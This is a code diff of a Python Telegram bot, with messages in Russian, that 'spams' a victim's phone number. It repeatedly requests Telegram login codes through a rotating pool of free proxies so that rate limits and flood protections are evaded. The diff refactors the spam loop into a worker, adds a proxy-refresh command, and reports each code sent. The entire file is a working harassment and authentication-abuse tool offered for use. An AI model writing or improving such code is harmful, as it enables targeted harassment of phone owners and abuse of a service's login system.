@@ -16,10 +16,11 @@ PROXYSCRAPE_URL = f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=d
 
 spam_tasks = {}
 proxy_pool = []
+proxy_index = 0
 
 async def fetch_proxies():
     async with aiohttp.ClientSession() as session:
-        async with session.get(PROXYSCRAPE_URL, timeout=30) as resp:
+        async with session.get(PROXYSCRAPE_URL, timeout=20) as resp:
             text = await resp.text()
             raw = [line.strip() for line in text.splitlines() if line.strip()]
             proxies = []
@@ -51,23 +52,36 @@ async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("Нет активного спама.")
 
-async def try_proxy(proxy, phone, chat_id, context):
+async def send_code_through_proxy(proxy, phone, chat_id, context):
     proto_map = {'socks5': socks.SOCKS5, 'socks4': socks.SOCKS4, 'http': socks.HTTP, 'https': socks.HTTP}
     proto = proto_map.get(proxy['protocol'], socks.SOCKS5)
-    for attempt in range(2):
-        try:
-            proxy_tuple = (proto, proxy['ip'], proxy['port'])
-            async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=15) as temp_client:
-                await temp_client.connect()
-                await temp_client.send_code_request(phone)
-                return True
-        except FloodWaitError as e:
-            await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
-            await asyncio.sleep(e.seconds)
+    try:
+        proxy_tuple = (proto, proxy['ip'], proxy['port'])
+        async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=10) as temp_client:
+            await temp_client.connect()
+            await temp_client.send_code_request(phone)
             return True
-        except Exception:
-            await asyncio.sleep(0.2)
-    return False
+    except FloodWaitError as e:
+        await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
+        await asyncio.sleep(e.seconds)
+        return True
+    except Exception:
+        return False
+
+async def spam_worker(phone, chat_id, context):
+    global proxy_index, proxy_pool
+    count = 0
+    while True:
+        if not proxy_pool:
+            await context.bot.send_message(chat_id, "Нет прокси, обновите /fetch_proxies")
+            break
+        proxy = proxy_pool[proxy_index % len(proxy_pool)]
+        proxy_index += 1
+        success = await send_code_through_proxy(proxy, phone, chat_id, context)
+        if success:
+            count += 1
+            await context.bot.send_message(chat_id, f"Код #{count} отправлен через {proxy['protocol']}://{proxy['ip']}:{proxy['port']}")
+        await asyncio.sleep(0.1)
 
 async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
@@ -76,36 +90,36 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Уже идет спам для этого чата.")
         return
 
-    await update.message.reply_text("Загружаю свежие прокси с ProxyScrape (API key)...")
     global proxy_pool
-    proxy_pool = await fetch_proxies()
     if not proxy_pool:
-        await update.message.reply_text("Не удалось получить прокси. Попробуй позже.")
-        return
-    await update.message.reply_text(f"Получено {len(proxy_pool)} прокси. Запускаю спам...")
+        await update.message.reply_text("Загружаю прокси...")
+        proxy_pool = await fetch_proxies()
+        if not proxy_pool:
+            await update.message.reply_text("Не удалось получить прокси. Попробуй позже.")
+            return
 
     client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
     await client.connect()
 
-    async def spam():
-        count = 0
-        idx = 0
-        while True:
-            proxy = proxy_pool[idx % len(proxy_pool)]
-            idx += 1
-            success = await try_proxy(proxy, phone, chat_id, context)
-            if success:
-                count += 1
-                await context.bot.send_message(chat_id, f"Код #{count} отправлен через {proxy['protocol']}://{proxy['ip']}:{proxy['port']}")
-            await asyncio.sleep(0.1)
-
-    task = asyncio.create_task(spam())
+    task = asyncio.create_task(spam_worker(phone, chat_id, context))
     spam_tasks[chat_id] = (task, client)
+    await update.message.reply_text(f"Спам запущен. Прокси: {len(proxy_pool)}. Для остановки /stop")
+
+async def fetch_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global proxy_pool, proxy_index
+    await update.message.reply_text("Обновляю список прокси...")
+    proxy_pool = await fetch_proxies()
+    proxy_index = 0
+    if proxy_pool:
+        await update.message.reply_text(f"Загружено {len(proxy_pool)} прокси.")
+    else:
+        await update.message.reply_text("Не удалось загрузить прокси.")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_spam))
+    app.add_handler(CommandHandler("fetch_proxies", fetch_proxies_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
     app.run_polling()
 
